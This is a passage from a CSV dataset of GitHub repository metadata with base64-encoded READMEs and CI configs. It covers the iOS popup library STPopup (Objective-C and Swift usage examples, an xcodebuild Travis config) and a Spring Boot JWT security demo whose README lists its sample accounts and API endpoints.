name,id,description,language,open_issues,stargazers_count,topics,watchers,fork,forks_url,readme,config,travis0,travis1,travis2,travis3,travis4,travis5,travis6,travis7,travis8,travis9,travis10,travis11,travis12,travis13,travis14,travis15,travis16,travis17,travis18,travis19,travis20,travis21,travis22,travis23,gitlab0,gitlab1,gitlab2,gitlab3,gitlab4,gitlab5,gitlab6,gitlab7,gitlab8,gitlab9,gitlab10,gitlab11,gitlab12,gitlab13,gitlab14,gitlab15,gitlab16,gitlab17,gitlab18,gitlab19,gitlab20,gitlab21,gitlab22,gitlab23,jenkinsPipeline0,jenkinsPipeline1,jenkinsPipeline2,jenkinsPipeline3,jenkinsPipeline4,jenkinsPipeline5,jenkinsPipeline6,jenkinsPipeline7,jenkinsPipeline8,jenkinsPipeline9,jenkinsPipeline10,jenkinsPipeline11,jenkinsPipeline12,jenkinsPipeline13,jenkinsPipeline14,jenkinsPipeline15,jenkinsPipeline16,jenkinsPipeline17,jenkinsPipeline18,jenkinsPipeline19,jenkinsPipeline20,jenkinsPipeline21,jenkinsPipeline22,jenkinsPipeline23,cirrus0,cirrus1,cirrus2,cirrus3,cirrus4,cirrus5,cirrus6,cirrus7,cirrus8,cirrus9,cirrus10,cirrus11,cirrus12,cirrus13,cirrus14,cirrus15,cirrus16,cirrus17,cirrus18,cirrus19,cirrus20,cirrus21,cirrus22,cirrus23,github0,github1,github2,github3,github4,github5,github6,github7,github8,github9,github10,github11,github12,github13,github14,github15,github16,github17,github18,github19,github20,github21,github22,github23,cds0,cds1,cds2,cds3,cds4,cds5,cds6,cds7,cds8,cds9,cds10,cds11,cds12,cds13,cds14,cds15,cds16,cds17,cds18,cds19,cds20,cds21,cds22,cds23,azure0,azure1,azure2,azure3,azure4,azure5,azure6,azure7,azure8,azure9,azure10,azure11,azure12,azure13,azure14,azure15,azure16,azure17,azure18,azure19,azure20,azure21,azure22,azure23,circleci0,circleci1,circleci2,circleci3,circleci4,circleci5,circleci6,circleci7,circleci8,circleci9,circleci10,circleci11,circleci12,circleci13,circleci14,circleci15,circleci16,circleci17,circleci18,circleci19,circleci20,circleci21,circleci22,circleci23,bitbucket0,bitbucket1,bitbucket2,bitbucket3,bitbucket4,bitbucket5,bitbucket6,bitbucket7,bitbucket8,bitbucket9,bitbucket10,bitbucket11,bitbucket12,bitbucket13,bitbucket14,bitbucket15,bitbucket16,bitbucket17,bitbucket18,bitbucket19,bitbucket20,bitbucket21,bitbucket22,bitbucket23
OiB0cnVlKSAvLyBQb3B1cCB3aWxsIGJlIGRpc21pc3NlZCBpZiB0aGVyZSBp
cyBvbmx5IG9uZSB2aWV3IGNvbnRyb2xsZXIgaW4gdGhlIHBvcHVwIHZpZXcg
Y29udHJvbGxlciBzdGFjawpwb3B1cENvbnRyb2xsZXI/LmRpc21pc3MoKQpg
YGAKCiFbUHVzaCAmIFBvcF0oaHR0cHM6Ly9jbG91ZC5naXRodWJ1c2VyY29u
dGVudC5jb20vYXNzZXRzLzE0OTEyODIvOTg1NzkxNS8wZDRhYjNlZS01YjUw
LTExZTUtODFiYy04ZmJhZTNhZDhjMDYuZ2lmKQoKKipCb3R0b20gc2hlZXQg
c3R5bGUqKiAgCk9iamVjdGl2ZS1DCmBgYG9iamMKU1RQb3B1cENvbnRyb2xs
ZXIgKnBvcHVwQ29udHJvbGxlciA9IFtbU1RQb3B1cENvbnRyb2xsZXIgYWxs
b2NdIGluaXRXaXRoUm9vdFZpZXdDb250cm9sbGVyOltWaWV3Q29udHJvbGxl
ciBuZXddXTsKcG9wdXBDb250cm9sbGVyLnN0eWxlID0gU1RQb3B1cFN0eWxl
Qm90dG9tU2hlZXQ7Cltwb3B1cENvbnRyb2xsZXIgcHJlc2VudEluVmlld0Nv
bnRyb2xsZXI6c2VsZl07CmBgYApTd2lmdApgYGBzd2lmdApsZXQgcG9wdXBD
b250cm9sbGVyID0gU1RQb3B1cENvbnRyb2xsZXIocm9vdFZpZXdDb250cm9s
bGVyOiB2aWV3Q29udHJvbGxlcikKcG9wdXBDb250cm9sbGVyLnN0eWxlID0g
LmJvdHRvbVNoZWV0CnBvcHVwQ29udHJvbGxlci5wcmVzZW50KGluOiBzZWxm
KQpgYGAKIVtCb3R0b20gU2hlZXRdKGh0dHBzOi8vY2xvdWQuZ2l0aHVidXNl
cmNvbnRlbnQuY29tL2Fzc2V0cy8xNDkxMjgyLzEwNDE3OTYzLzc2NDlmMzU2
LTcwODAtMTFlNS04ZjNjLTBjYjgxN2I4MzUzZS5naWYpCgoqKkN1c3RvbWl6
ZSBwb3B1cCB0cmFuc2l0aW9uIHN0eWxlKiogIApPYmplY3RpdmUtQwpgYGBv
YmpjCiNwcmFnbWEgbWFyayAtIFNUUG9wdXBDb250cm9sbGVyVHJhbnNpdGlv
bmluZwoKLSAoTlNUaW1lSW50ZXJ2YWwpcG9wdXBDb250cm9sbGVyVHJhbnNp
dGlvbkR1cmF0aW9uOihTVFBvcHVwQ29udHJvbGxlclRyYW5zaXRpb25pbmdD
b250ZXh0ICopY29udGV4dAp7CiAgICByZXR1cm4gY29udGV4dC5hY3Rpb24g
PT0gU1RQb3B1cENvbnRyb2xsZXJUcmFuc2l0aW9uaW5nQWN0aW9uUHJlc2Vu
dCA/IDAuNSA6IDAuMzU7Cn0KCi0gKHZvaWQpcG9wdXBDb250cm9sbGVyQW5p
bWF0ZVRyYW5zaXRpb246KFNUUG9wdXBDb250cm9sbGVyVHJhbnNpdGlvbmlu
Z0NvbnRleHQgKiljb250ZXh0IGNvbXBsZXRpb246KHZvaWQgKF4pKCkpY29t
cGxldGlvbgp7CiAgICAvLyBQb3B1cCB3aWxsIGJlIHByZXNlbnRlZCB3aXRo
IGFuIGFuaW1hdGlvbiBzbGlkaW5nIGZyb20gcmlnaHQgdG8gbGVmdC4KICAg
IFVJVmlldyAqY29udGFpbmVyVmlldyA9IGNvbnRleHQuY29udGFpbmVyVmll
dzsKICAgIGlmIChjb250ZXh0LmFjdGlvbiA9PSBTVFBvcHVwQ29udHJvbGxl
clRyYW5zaXRpb25pbmdBY3Rpb25QcmVzZW50KSB7CiAgICAgICAgY29udGFp
bmVyVmlldy50cmFuc2Zvcm0gPSBDR0FmZmluZVRyYW5zZm9ybU1ha2VUcmFu
c2xhdGlvbihjb250YWluZXJWaWV3LnN1cGVydmlldy5ib3VuZHMuc2l6ZS53
aWR0aCAtIGNvbnRhaW5lclZpZXcuZnJhbWUub3JpZ2luLngsIDApOwogICAg
ICAgIAogICAgICAgIFtVSVZpZXcgYW5pbWF0ZVdpdGhEdXJhdGlvbjpbc2Vs
ZiBwb3B1cENvbnRyb2xsZXJUcmFuc2l0aW9uRHVyYXRpb246Y29udGV4dF0g
ZGVsYXk6MCB1c2luZ1NwcmluZ1dpdGhEYW1waW5nOjEgaW5pdGlhbFNwcmlu
Z1ZlbG9jaXR5OjEgb3B0aW9uczpVSVZpZXdBbmltYXRpb25PcHRpb25DdXJ2
ZUVhc2VJbk91dCBhbmltYXRpb25zOl57CiAgICAgICAgICAgIGNvbnRleHQu
Y29udGFpbmVyVmlldy50cmFuc2Zvcm0gPSBDR0FmZmluZVRyYW5zZm9ybUlk
ZW50aXR5OwogICAgICAgIH0gY29tcGxldGlvbjpeKEJPT0wgZmluaXNoZWQp
IHsKICAgICAgICAgICAgY29tcGxldGlvbigpOwogICAgICAgIH1dOwogICAg
fQogICAgZWxzZSB7CiAgICAgICAgW1VJVmlldyBhbmltYXRlV2l0aER1cmF0
aW9uOltzZWxmIHBvcHVwQ29udHJvbGxlclRyYW5zaXRpb25EdXJhdGlvbjpj
b250ZXh0XSBkZWxheTowIG9wdGlvbnM6VUlWaWV3QW5pbWF0aW9uT3B0aW9u
Q3VydmVFYXNlT3V0IGFuaW1hdGlvbnM6XnsKICAgICAgICAgICAgY29udGFp
bmVyVmlldy50cmFuc2Zvcm0gPSBDR0FmZmluZVRyYW5zZm9ybU1ha2VUcmFu
c2xhdGlvbigtIDIgKiAoY29udGFpbmVyVmlldy5zdXBlcnZpZXcuYm91bmRz
LnNpemUud2lkdGggLSBjb250YWluZXJWaWV3LmZyYW1lLm9yaWdpbi54KSwg
MCk7CiAgICAgICAgfSBjb21wbGV0aW9uOl4oQk9PTCBmaW5pc2hlZCkgewog
ICAgICAgICAgICBjb250YWluZXJWaWV3LnRyYW5zZm9ybSA9IENHQWZmaW5l
VHJhbnNmb3JtSWRlbnRpdHk7CiAgICAgICAgICAgIGNvbXBsZXRpb24oKTsK
ICAgICAgICB9XTsKICAgIH0KfQoKLy8gVXNlIGN1c3RvbSB0cmFuc2l0aW9u
aW5nIGluIHBvcHVwIGNvbnRyb2xsZXIKU1RQb3B1cENvbnRyb2xsZXIgKnBv
cHVwQ29udHJvbGxlciA9IFtbU1RQb3B1cENvbnRyb2xsZXIgYWxsb2NdIGlu
aXRXaXRoUm9vdFZpZXdDb250cm9sbGVyOnZpZXdDb250cm9sbGVyXTsKcG9w
dXBDb250cm9sbGVyLnRyYW5zaXRpb25TdHlsZSA9IFNUUG9wdXBUcmFuc2l0
aW9uU3R5bGVDdXN0b207CnBvcHVwQ29udHJvbGxlci50cmFuc2l0aW9uaW5n
ID0gc2VsZjsKW3BvcHVwQ29udHJvbGxlciBwcmVzZW50SW5WaWV3Q29udHJv
bGxlcjpzZWxmXTsKYGBgClN3aWZ0CmBgYHN3aWZ0Ci8vIE1BUks6IFNUUG9w
dXBDb250cm9sbGVyVHJhbnNpdGlvbmluZwoKZnVuYyBwb3B1cENvbnRyb2xs
ZXJUcmFuc2l0aW9uRHVyYXRpb24oXyBjb250ZXh0OiBTVFBvcHVwQ29udHJv
bGxlclRyYW5zaXRpb25pbmdDb250ZXh0KSAtPiBUaW1lSW50ZXJ2YWwgewog
ICAgcmV0dXJuIGNvbnRleHQuYWN0aW9uID09IC5wcmVzZW50ID8gMC41IDog
MC4zNQp9CgpmdW5jIHBvcHVwQ29udHJvbGxlckFuaW1hdGVUcmFuc2l0aW9u
KF8gY29udGV4dDogU1RQb3B1cENvbnRyb2xsZXJUcmFuc2l0aW9uaW5nQ29u
dGV4dCwgY29tcGxldGlvbjogQGVzY2FwaW5nICgpIC0+IFZvaWQpIHsKICAg
IC8vIFBvcHVwIHdpbGwgYmUgcHJlc2VudGVkIHdpdGggYW4gYW5pbWF0aW9u
IHNsaWRpbmcgZnJvbSByaWdodCB0byBsZWZ0LgogICAgbGV0IGNvbnRhaW5l
clZpZXcgPSBjb250ZXh0LmNvbnRhaW5lclZpZXcKICAgIGlmIGNvbnRleHQu
YWN0aW9uID09IC5wcmVzZW50IHsKICAgICAgICBjb250YWluZXJWaWV3LnRy
YW5zZm9ybSA9IENHQWZmaW5lVHJhbnNmb3JtKHRyYW5zbGF0aW9uWDogY29u
dGFpbmVyVmlldy5zdXBlcnZpZXchLmJvdW5kcy5zaXplLndpZHRoIC0gY29u
dGFpbmVyVmlldy5mcmFtZS5vcmlnaW4ueCwgeTogMCkKICAgICAgICBVSVZp
ZXcuYW5pbWF0ZSh3aXRoRHVyYXRpb246IHBvcHVwQ29udHJvbGxlclRyYW5z
aXRpb25EdXJhdGlvbihjb250ZXh0KSwgZGVsYXk6IDAsIHVzaW5nU3ByaW5n
V2l0aERhbXBpbmc6IDEsIGluaXRpYWxTcHJpbmdWZWxvY2l0eTogMSwgb3B0
aW9uczogLmN1cnZlRWFzZUluT3V0LCBhbmltYXRpb25zOiB7CiAgICAgICAg
ICAgIGNvbnRhaW5lclZpZXcudHJhbnNmb3JtID0gLmlkZW50aXR5CiAgICAg
ICAgfSwgY29tcGxldGlvbjogeyBfIGluCiAgICAgICAgICAgIGNvbXBsZXRp
b24oKQogICAgICAgIH0pOwogICAgfSBlbHNlIHsKICAgICAgICBVSVZpZXcu
YW5pbWF0ZSh3aXRoRHVyYXRpb246IHBvcHVwQ29udHJvbGxlclRyYW5zaXRp
b25EdXJhdGlvbihjb250ZXh0KSwgZGVsYXk6IDAsIHVzaW5nU3ByaW5nV2l0
aERhbXBpbmc6IDEsIGluaXRpYWxTcHJpbmdWZWxvY2l0eTogMSwgb3B0aW9u
czogLmN1cnZlRWFzZUluT3V0LCBhbmltYXRpb25zOiB7CiAgICAgICAgICAg
IGNvbnRhaW5lclZpZXcudHJhbnNmb3JtID0gQ0dBZmZpbmVUcmFuc2Zvcm0o
dHJhbnNsYXRpb25YOiAtMiAqIChjb250YWluZXJWaWV3LnN1cGVydmlldyEu
Ym91bmRzLnNpemUud2lkdGggLSBjb250YWluZXJWaWV3LmZyYW1lLm9yaWdp
bi54KSwgeTogMCkKICAgICAgICB9LCBjb21wbGV0aW9uOiB7IF8gaW4KICAg
ICAgICAgICAgY29udGFpbmVyVmlldy50cmFuc2Zvcm0gPSAuaWRlbnRpdHkK
ICAgICAgICAgICAgY29tcGxldGlvbigpCiAgICAgICAgfSk7CiAgICB9Cn0K
Ci8vIFVzZSBjdXN0b20gdHJhbnNpdGlvbmluZyBpbiBwb3B1cCBjb250cm9s
bGVyCmxldCBwb3B1cENvbnRyb2xsZXIgPSBsZXQgcG9wdXBDb250cm9sbGVy
ID0gU1RQb3B1cENvbnRyb2xsZXIocm9vdFZpZXdDb250cm9sbGVyOiB2aWV3
Q29udHJvbGxlcikKcG9wdXBDb250cm9sbGVyLnRyYW5zaXRpb25TdHlsZSA9
IC5jdXN0b20KcG9wdXBDb250cm9sbGVyLnRyYW5zaXRpb25pbmcgPSBzZWxm
CnBvcHVwQ29udHJvbGxlci5wcmVzZW50KGluOiBzZWxmKQpgYGAKCioqQmx1
ciBiYWNrZ3JvdW5kKiogIApPYmplY3RpdmUtQwpgYGBvYmpjClNUUG9wdXBD
b250cm9sbGVyICpwb3B1cENvbnRyb2xsZXIgPSBbW1NUUG9wdXBDb250cm9s
bGVyIGFsbG9jXSBpbml0V2l0aFJvb3RWaWV3Q29udHJvbGxlcjpbUG9wdXBW
aWV3Q29udHJvbGxlcjEgbmV3XV07CmlmIChOU0NsYXNzRnJvbVN0cmluZyhA
IlVJQmx1ckVmZmVjdCIpKSB7CiAgICBVSUJsdXJFZmZlY3QgKmJsdXJFZmZl
Y3QgPSBbVUlCbHVyRWZmZWN0IGVmZmVjdFdpdGhTdHlsZTpVSUJsdXJFZmZl
Y3RTdHlsZURhcmtdOwogICAgcG9wdXBDb250cm9sbGVyLmJhY2tncm91bmRW
aWV3ID0gW1tVSVZpc3VhbEVmZmVjdFZpZXcgYWxsb2NdIGluaXRXaXRoRWZm
ZWN0OmJsdXJFZmZlY3RdOwp9CmBgYApTd2lmdApgYGBzd2lmdApsZXQgcG9w
dXBDb250cm9sbGVyID0gbGV0IHBvcHVwQ29udHJvbGxlciA9IFNUUG9wdXBD
b250cm9sbGVyKHJvb3RWaWV3Q29udHJvbGxlcjogdmlld0NvbnRyb2xsZXIp
CmlmIE5TQ2xhc3NGcm9tU3RyaW5nKCJVSUJsdXJFZmZlY3QiKSAhPSBuaWwg
ewogICAgbGV0IGJsdXJFZmZlY3QgPSBVSUJsdXJFZmZlY3Qoc3R5bGU6IC5k
YXJrKQogICAgcG9wdXBDb250cm9sbGVyLmJhY2tncm91bmRWaWV3ID0gVUlW
aXN1YWxFZmZlY3RWaWV3KGVmZmVjdDogYmx1ckVmZmVjdCkKfQpgYGAKCioq
QWN0aW9uIG9mIHRhcHBpbmcgb24gYXJlYSBvdXRzaWRlIG9mIHBvcHVwKiog
IApPYmplY3RpdmUtQwpgYGBvYmpjCltwb3B1cENvbnRyb2xsZXIuYmFja2dy
b3VuZFZpZXcgYWRkR2VzdHVyZVJlY29nbml6ZXI6W1tVSVRhcEdlc3R1cmVS
ZWNvZ25pemVyIGFsbG9jXSBpbml0V2l0aFRhcmdldDpzZWxmIGFjdGlvbjpA
c2VsZWN0b3IoYmFja2dyb3VuZFZpZXdEaWRUYXApXV07CmBgYApTd2lmdApg
YGBzd2lmdApwb3B1cENvbnRyb2xsZXIuYmFja2dyb3VuZFZpZXc/LmFkZEdl
c3R1cmVSZWNvZ25pemVyKFVJVGFwR2VzdHVyZVJlY29nbml6ZXIodGFyZ2V0
OiBzZWxmLCBhY3Rpb246ICNzZWxlY3RvcihiYWNrZ3JvdW5kVmlld0RpZFRh
cCkpKQpgYGAKCioqQ3VzdG9taXplIFVJKiogIApPYmplY3RpdmUtQwpgYGBv
YmpjCltTVFBvcHVwTmF2aWdhdGlvbkJhciBhcHBlYXJhbmNlXS5iYXJUaW50
Q29sb3IgPSBbVUlDb2xvciBjb2xvcldpdGhSZWQ6MC4yMCBncmVlbjowLjYw
IGJsdWU6MC44NiBhbHBoYToxLjBdOwpbU1RQb3B1cE5hdmlnYXRpb25CYXIg
YXBwZWFyYW5jZV0udGludENvbG9yID0gW1VJQ29sb3Igd2hpdGVDb2xvcl07
CltTVFBvcHVwTmF2aWdhdGlvbkJhciBhcHBlYXJhbmNlXS5iYXJTdHlsZSA9
IFVJQmFyU3R5bGVEZWZhdWx0OwpbU1RQb3B1cE5hdmlnYXRpb25CYXIgYXBw
ZWFyYW5jZV0udGl0bGVUZXh0QXR0cmlidXRlcyA9IEB7IE5TRm9udEF0dHJp
YnV0ZU5hbWU6IFtVSUZvbnQgZm9udFdpdGhOYW1lOkAiQ29jaGluIiBzaXpl
OjE4XSwgTlNGb3JlZ3JvdW5kQ29sb3JBdHRyaWJ1dGVOYW1lOiBbVUlDb2xv
ciB3aGl0ZUNvbG9yXSB9OwogICAgCltbVUlCYXJCdXR0b25JdGVtIGFwcGVh
cmFuY2VXaGVuQ29udGFpbmVkSW46W1NUUG9wdXBOYXZpZ2F0aW9uQmFyIGNs
YXNzXSwgbmlsXSBzZXRUaXRsZVRleHRBdHRyaWJ1dGVzOkB7IE5TRm9udEF0
dHJpYnV0ZU5hbWU6W1VJRm9udCBmb250V2l0aE5hbWU6QCJDb2NoaW4iIHNp
emU6MTddIH0gZm9yU3RhdGU6VUlDb250cm9sU3RhdGVOb3JtYWxdOwpgYGAK
U3dpZnQKYGBgc3dpZnQKU1RQb3B1cE5hdmlnYXRpb25CYXIuYXBwZWFyYW5j
ZSgpLmJhclRpbnRDb2xvciA9IFVJQ29sb3IocmVkOiAwLjIsIGdyZWVuOiAw
LjYsIGJsdWU6IDAuODYsIGFscGhhOiAxKQpTVFBvcHVwTmF2aWdhdGlvbkJh
ci5hcHBlYXJhbmNlKCkudGludENvbG9yID0gLndoaXRlClNUUG9wdXBOYXZp
Z2F0aW9uQmFyLmFwcGVhcmFuY2UoKS5iYXJTdHlsZSA9IC5kZWZhdWx0ClNU
UG9wdXBOYXZpZ2F0aW9uQmFyLmFwcGVhcmFuY2UoKS50aXRsZVRleHRBdHRy
aWJ1dGVzID0gWwogICAgLmZvbnQ6IFVJRm9udChuYW1lOiAiQ29jaGluIiwg
c2l6ZTogMTgpID8/IC5zeXN0ZW1Gb250KG9mU2l6ZTogMTgpLAogICAgLmZv
cmVncm91bmRDb2xvcjogVUlDb2xvci53aGl0ZSwKXQpVSUJhckJ1dHRvbkl0
ZW0KICAgIC5hcHBlYXJhbmNlKHdoZW5Db250YWluZWRJbkluc3RhbmNlc09m
OiBbU1RQb3B1cE5hdmlnYXRpb25CYXIuc2VsZl0pCiAgICAuc2V0VGl0bGVU
ZXh0QXR0cmlidXRlcyhbCiAgICAgICAgLmZvbnQ6IFVJRm9udChuYW1lOiAi
Q29jaGluIiwgc2l6ZTogMTgpID8/IC5zeXN0ZW1Gb250KG9mU2l6ZTogMTgp
LAogICAgICAgIF0sIGZvcjogLm5vcm1hbCkKYGBgCiFbQ3VzdG9taXplIFVJ
XShodHRwczovL2Nsb3VkLmdpdGh1YnVzZXJjb250ZW50LmNvbS9hc3NldHMv
MTQ5MTI4Mi85OTExMzA2LzBmNmRiMDU2LTVjZDQtMTFlNS05MzI5LTMzYjBj
ZjAyZTFiMC5wbmcpCgoqKkF1dG8tcmVwb3NpdGlvbiB3aGVuIGtleWJvYXJk
IGlzIHNob3dpbmcgdXAqKiAgClRoaXMgaXMgZGVmYXVsdCBiZWhhdmlvci4g
IAohW0F1dG8tcmVwb3NpdGlvbl0oaHR0cHM6Ly9jbG91ZC5naXRodWJ1c2Vy
Y29udGVudC5jb20vYXNzZXRzLzE0OTEyODIvOTg1ODI3Ny81YjI5YjEzMC01
YjUyLTExZTUtOTU2OS03NTYwYTA4NTM0OTMuZ2lmKQoKKipEcmFnIHRvIGRp
c21pc3MqKiAgClRoaXMgaXMgZGVmYXVsdCBiZWhhdmlvci4gIAohW0RyYWcg
dG8gZGlzbWlzc10oaHR0cHM6Ly9jbG91ZC5naXRodWJ1c2VyY29udGVudC5j
b20vYXNzZXRzLzE0OTEyODIvOTg1ODMzNC9iMTAzZmM5Ni01YjUyLTExZTUt
OWMzZi01MTczNjdlZDkzODYuZ2lmKQoKKipIYW5kbGUgb3JpZW50YXRpb24g
Y2hhbmdlKiogIApUaGlzIGlzIGRlZmF1bHQgYmVoYXZpb3IuICAKIVtPcmll
bnRhdGlvbiBjaGFuZ2VdKGh0dHBzOi8vY2xvdWQuZ2l0aHVidXNlcmNvbnRl
bnQuY29tL2Fzc2V0cy8xNDkxMjgyLzk4NTgzNzIvZTY1Mzg4ODAtNWI1Mi0x
MWU1LTg4ODItODcwNTU4ODYwNmJhLmdpZikKClBsZWFzZSBjaGVja291dCB0
aGUgZXhhbXBsZSBwcm9qZWN0IGZvciBtb3JlIGRldGFpbHMuCg==
",,"bGFuZ3VhZ2U6IG9iamVjdGl2ZS1jCm9zeF9pbWFnZTogeGNvZGU5CnNjcmlw
dDoKICAgIC0geGNvZGVidWlsZCAtcHJvamVjdCBTVFBvcHVwLnhjb2RlcHJv
aiAtc2NoZW1lIFNUUG9wdXAgLXNkayBpcGhvbmVzaW11bGF0b3IK
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'jwt-spring-security-demo',54335585,b'A demo for using JWT (Json Web Token) with Spring Security and Spring Boot 2',b'Java',0,2379,,2379,False,b'https://api.github.com/repos/szerhusenBC/jwt-spring-security-demo/forks',"IyBKV1QgU3ByaW5nIFNlY3VyaXR5IERlbW8KCiFbU2NyZWVuc2hvdCBmcm9t
IHJ1bm5pbmcgYXBwbGljYXRpb25dKGV0Yy9zY3JlZW5zaG90LWp3dC1zcHJp
bmctc2VjdXJpdHktZGVtby5wbmc/cmF3PXRydWUgIlNjcmVlbnNob3QgSldU
IFNwcmluZyBTZWN1cml0eSBEZW1vIikKCiMjIEFib3V0ClRoaXMgaXMgYSBk
ZW1vIGZvciB1c2luZyAqKltKV1QgKEpTT04gV2ViIFRva2VuKV0oaHR0cHM6
Ly9qd3QuaW8pKiogd2l0aCAqKltTcHJpbmcgU2VjdXJpdHldKGh0dHBzOi8v
c3ByaW5nLmlvL3Byb2plY3RzL3NwcmluZy1zZWN1cml0eSkqKiBhbmQKKipb
U3ByaW5nIEJvb3RdKGh0dHBzOi8vc3ByaW5nLmlvL3Byb2plY3RzL3Nwcmlu
Zy1ib290KSoqLiBJIGNvbXBsZXRlbHkgcmV3cm90ZSBteSBmaXJzdCB2ZXJz
aW9uLiBOb3cgdGhpcyBzb2x1dGlvbiBpcyBiYXNlZCBvbiB0aGUgY29kZSBi
YXNlCmZyb20gdGhlIFtKSGlwc3RlciBQcm9qZWN0XShodHRwczovL3d3dy5q
aGlwc3Rlci50ZWNoLykuIEkgdHJpZWQgdG8gZXh0cmFjdCB0aGUgbWluaW1h
bCBjb25maWd1cmF0aW9uIGFuZCBjbGFzc2VzIHRoYXQgYXJlIG5lZWRlZCAK
Zm9yIEpXVC1BdXRoZW50aWNhdGlvbiBhbmQgZGlkIHNvbWUgY2hhbmdlcy4K
ClshW0J1aWxkIFN0YXR1c10oaHR0cHM6Ly90cmF2aXMtY2kub3JnL3N6ZXJo
dXNlbkJDL2p3dC1zcHJpbmctc2VjdXJpdHktZGVtby5zdmc/YnJhbmNoPW1h
c3RlcildKGh0dHBzOi8vdHJhdmlzLWNpLm9yZy9zemVyaHVzZW5CQy9qd3Qt
c3ByaW5nLXNlY3VyaXR5LWRlbW8pCgojIyBSZXF1aXJlbWVudHMKVGhpcyBk
ZW1vIGlzIGJ1aWxkIHdpdGggd2l0aCBNYXZlbiAzLjYueCBhbmQgSmF2YSAx
MS4KCiMjIFVzYWdlCkp1c3Qgc3RhcnQgdGhlIGFwcGxpY2F0aW9uIHdpdGgg
dGhlIFNwcmluZyBCb290IG1hdmVuIHBsdWdpbiAoYG12biBzcHJpbmctYm9v
dDpydW5gKS4gVGhlIGFwcGxpY2F0aW9uIGlzCnJ1bm5pbmcgYXQgW2h0dHA6
Ly9sb2NhbGhvc3Q6ODA4MF0oaHR0cDovL2xvY2FsaG9zdDo4MDgwKS4KCllv
dSBjYW4gdXNlIHRoZSAqKkgyLUNvbnNvbGUqKiBmb3IgZXhwbG9yaW5nIHRo
ZSBkYXRhYmFzZSB1bmRlciBbaHR0cDovL2xvY2FsaG9zdDo4MDgwL2gyLWNv
bnNvbGVdKGh0dHA6Ly9sb2NhbGhvc3Q6ODA4MC9oMi1jb25zb2xlKToKCiFb
U2NyZWVuc2hvdCBmcm9tIGgyLWNvbnNvbGUgbG9naW5dKGV0Yy9zY3JlZW5z
aG90LWgyLWNvbnNvbGUtbG9naW4ucG5nP3Jhdz10cnVlICJTY3JlZW5zaG90
IEgyLUNvbnNvbGUgbG9naW4iKQoKIyMgQmFja2VuZApUaGVyZSBhcmUgdGhy
ZWUgdXNlciBhY2NvdW50cyBwcmVzZW50IHRvIGRlbW9uc3RyYXRlIHRoZSBk
aWZmZXJlbnQgbGV2ZWxzIG9mIGFjY2VzcyB0byB0aGUgZW5kcG9pbnRzIGlu
CnRoZSBBUEkgYW5kIHRoZSBkaWZmZXJlbnQgYXV0aG9yaXphdGlvbiBleGNl
cHRpb25zOgpgYGAKQWRtaW4gLSBhZG1pbjphZG1pbgpVc2VyIC0gdXNlcjpw
YXNzd29yZApEaXNhYmxlZCAtIGRpc2FibGVkOnBhc3N3b3JkICh0aGlzIHVz
ZXIgaXMgZGVhY3RpdmF0ZWQpCmBgYAoKVGhlcmUgYXJlIGZvdXIgZW5kcG9p
bnRzIHRoYXQgYXJlIHJlYXNvbmFibGUgZm9yIHRoZSBkZW1vOgpgYGAKL2Fw
aS9hdXRoZW50aWNhdGUgLSBhdXRoZW50aWNhdGlvbiBlbmRwb2ludCB3aXRo
IHVucmVzdHJpY3RlZCBhY2Nlc3MKL2FwaS91c2VyIC0gcmV0dXJucyBkZXRh
aWwgaW5mb3JtYXRpb24gZm9yIGFuIGF1dGhlbnRpY2F0ZWQgdXNlciAoYSB2
YWxpZCBKV1QgdG9rZW4gbXVzdCBiZSBwcmVzZW50IGluIHRoZSByZXF1ZXN0
IGhlYWRlcikKL2FwaS9wZXJzb25zIC0gYW4gZXhhbXBsZSBlbmRwb2ludCB0
aGF0IGlzIHJlc3RyaWN0ZWQgdG8gYXV0aG9yaXplZCB1c2VycyB3aXRoIHRo
ZSBhdXRob3JpdHkgJ1JPTEVfVVNFUicgKGEgdmFsaWQgSldUIHRva2VuIG11
c3QgYmUgcHJlc2VudCBpbiB0aGUgcmVxdWVzdCBoZWFkZXIpCi9hcGkvaGlk
ZGVubWVzc2FnZSAtIGFuIGV4YW1wbGUgZW5kcG9pbnQgdGhhdCBpcyByZXN0
cmljdGVkIHRvIGF1dGhvcml6ZWQgdXNlcnMgd2l0aCB0aGUgYXV0aG9yaXR5
ICdST0xFX0FETUlOJyAoYSB2YWxpZCBKV1QgdG9rZW4gbXVzdCBiZSBwcmVz
ZW50IGluIHRoZSByZXF1ZXN0IGhlYWRlcikKYGBgCgojIyBGcm9udGVuZApJ
J3ZlIHdyaXR0ZW4gYSBzbWFsbCBKYXZhc2NyaXB0IGNsaWVudCBhbmQgcHV0
IHNvbWUgY29tbWVudHMgaW4gdGhlIGNvZGUgdGhhdCBob3BlZnVsbHkgbWFr
ZXMgdGhpcyBkZW1vIHVuZGVyc3RhbmRhYmxlLgpZb3UgY2FuIGZpbmQgaXQg
YXQgWy9zcmMvbWFpbi9yZXNvdXJjZXMvc3RhdGljL2pzL2NsaWVudC5qc10o
L3NyYy9tYWluL3Jlc291cmNlcy9zdGF0aWMvanMvY2xpZW50LmpzKS4KCiMj
